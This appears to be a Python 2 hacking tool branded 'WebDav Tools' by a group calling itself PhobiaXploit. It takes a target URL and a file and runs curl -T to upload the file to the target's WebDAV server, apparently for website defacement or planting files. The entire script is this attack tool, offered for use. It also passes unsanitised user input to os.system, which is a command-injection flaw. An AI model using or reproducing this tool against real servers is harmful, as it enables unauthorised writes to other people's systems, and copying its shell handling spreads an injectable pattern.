#!/usr/bin/python

import os
import sys
os.system("clear")

def banner():
 print ("""
\t _  _  _ _______ ______  ______  _______ _    _
\t |  |  | |______ |_____] |     \ |_____|  \  / 
\t |__|__| |______ |_____] |_____/ |     |   \/  
\t Author  : Dominic404
\t Team    : PhobiaXploit
\t Blog    : www.dominictoretto.zone.id  
""")

def main():

    while True:
        px = raw_input("WebDav@Tools:~#").lower()
        
        if px == 'banner':
            os.system("clear")
            banner()
            main()
            
        elif "set url" in px:
            url = px.split()[-1]
            
        elif "set file" in px:
            file_name = px.split()[-1]
            
        elif px == "show":
            print "\n[*] Target  : %s\n[*] Filename  : %s\n" % (url,file_name)
         
        elif px == "start":
            print("[!] Starting WebDav")
            os.system("sleep 2")
            print("[!] Target  : %s\n[!] Filename   : %s" % (url,file_name))
            os.system("sleep 2")
            os.system("curl -T %s %s" % (file_name,url)) 
            
        else:
            print("[!] What Your Entered Is Wrong")    
            main()                

def control():
    try:
        banner()
        main()
    except KeyboardInterrupt:
        print("\n[+] Detect . . .")
        os.system("sleep 1")
if __name__ == "__main__":
    control()                                 
